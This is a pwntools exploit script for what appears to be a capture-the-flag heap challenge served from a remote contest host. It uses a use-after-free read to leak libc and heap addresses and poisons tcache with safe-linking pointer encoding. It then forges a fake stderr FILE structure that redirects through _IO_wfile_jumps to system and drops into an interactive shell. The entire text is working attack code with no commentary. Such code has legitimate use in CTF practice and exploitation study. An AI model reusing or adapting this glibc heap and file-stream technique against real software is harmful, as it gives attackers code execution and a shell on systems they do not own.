from pwn import *

elf = ELF("./chal_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf
context.terminal = ["konsole", "-e"]

# p = process(stdout=PIPE)
p = remote("chall1.lagncra.sh", 19917)
# gdb.attach(p)

def create(idx, size):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'> ', str(idx).encode())
    p.sendlineafter(b'> ', str(size).encode())

def write(idx, data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'> ', str(idx).encode())
    p.sendlineafter(b': \n', data)

def read(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'> ', str(idx).encode())
    return p.recvuntil(b'Welcome', drop=True)

def free(idx):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'> ', str(idx).encode())

def encrypt(pos, ptr):
    return (pos >> 12) ^ ptr

for i in range(10):
    if(i == 7):
        create(i, 16)
    else:
        create(i, 0x400)

create(10, 0x200)

for i in range(10):
    if(i == 7):
        continue
    
    free(i)


libc_leak = u64(read(7)[32:40]) - libc.symbols['main_arena'] - 96

create(11, 0x200)
create(12, 0x200)
free(12)
create(12, 0x200)
heap_base = (u64(read(12)[:8]) - 2) << 12 
print(hex(heap_base))

free(12)
free(11)

write(7, flat(
    b'a' * 16, 0,
    pack(0x211),
    encrypt(heap_base + 8096, libc_leak + libc.symbols['_IO_2_1_stderr_'])
))

write(10, flat({
    0: libc_leak + libc.symbols['system'],
    0x18: 0,
    0x30: 0,
    0xe0: heap_base+10176-0x68
}, filler=b'\x00'))

create(13, 0x200)
create(14, 0x200)
write(14, flat({
    0: b" sh".ljust(8,b'\x00'),
    0x20: 0,
    0x28: 1,
    0xa0: heap_base + 10176,
    0xc0: 0,
    136: heap_base + 0x200,
    0xd8: libc_leak + libc.symbols['_IO_wfile_jumps'],
}))

p.interactive()
